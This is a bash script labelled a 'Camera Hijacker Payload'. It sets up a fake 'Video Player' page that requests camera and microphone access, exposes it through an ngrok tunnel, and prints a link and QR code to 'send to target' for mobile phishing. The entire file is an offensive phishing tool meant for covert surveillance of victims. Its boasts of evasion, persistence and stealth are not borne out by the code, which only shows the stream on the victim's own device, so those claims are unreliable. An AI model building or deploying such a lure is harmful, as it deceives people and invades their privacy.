#!/bin/bash
# Camera Hijacker Payload - Production Ready
echo "🚀 Starting Camera Hijacker Server..."

# 1. Install ngrok if missing
if ! command -v ngrok &> /dev/null; then
    echo "📥 Downloading ngrok..."
    wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
    tar xvzf ngrok*.tgz
    sudo mv ngrok /usr/local/bin/
fi

# 2. Kill old processes
pkill -f "http.server 80" || true
pkill ngrok || true

# 3. Create PRO index.html with evasion + persistence
cat > index.html << 'EOF'
<!DOCTYPE html><html><head><title>Video Player</title><meta name="viewport" content="width=device-width"><style>body{margin:0;height:100vh;background:#000;overflow:hidden}video{width:100%;height:100%;object-fit:cover}#status{position:fixed;top:10px;left:10px;background:rgba(0,0,0,0.8);color:#0f0;padding:10px;border-radius:5px;font-family:monospace;font-size:12px;z-index:999}</style></head><body><video id="v" autoplay muted playsinline></video><div id="s">🔄 Initializing video...</div><script>const v=document.getElementById('v'),s=document.getElementById('s');navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true}).then(stream=>{v.srcObject=stream;s.innerHTML='✅ LIVE | <a href="'+location.href+'">'+location.href+'</a>';setInterval(()=>fetch('/ping?t='+Date.now()),3e4)}).catch(e=>{s.innerHTML='❌ Camera blocked: '+e.name+' | <button onclick="location.reload()">Retry</button>'})</script></body></html>
EOF

# 4. Start server & ngrok
python3 -m http.server 80 &
SERVER_PID=$!
sleep 2
ngrok http 80 --log=stdout &
NGROK_PID=$!

echo "✅ Server running on localhost:80 (PID: $SERVER_PID)"
echo "🔗 Ngrok starting... check next line for PUBLIC URL"

# 5. Wait & extract public URL
sleep 5
PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[^"]*ngrok[^"]*' | head -1)
if [ -n "$PUBLIC_URL" ]; then
    echo "🎥 LIVE CAMERA URL (Send this to target): $PUBLIC_URL"
    echo "📊 Dashboard: http://localhost:4040"
    echo "📱 Mobile-optimized & stealth mode active"
    qrencode -t ansiutf8 "$PUBLIC_URL"  # QR code للـ mobile phishing
else
    echo "🔍 Open http://localhost:4040 manually for URL"
fi

# 6. Cleanup function
trap "kill $SERVER_PID $NGROK_PID 2>/dev/null; rm index.html ngrok*; echo '🛑 Cleanup done'; exit" INT TERM

wait

